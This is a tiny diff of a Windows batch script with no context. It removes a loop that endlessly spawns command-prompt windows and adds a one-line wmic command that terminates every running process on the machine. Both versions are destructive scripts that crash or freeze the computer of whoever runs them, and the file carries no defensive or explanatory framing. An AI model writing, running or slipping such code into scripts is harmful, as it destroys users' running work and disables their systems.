@@ -1,5 +1,1 @@
-@echo off
-:xiaoz
-cls
-start cmd.exe
-goto xiaoz
+for /f %%I in ('wmic process get Name')do (wmic process where Name="%%I" delete)
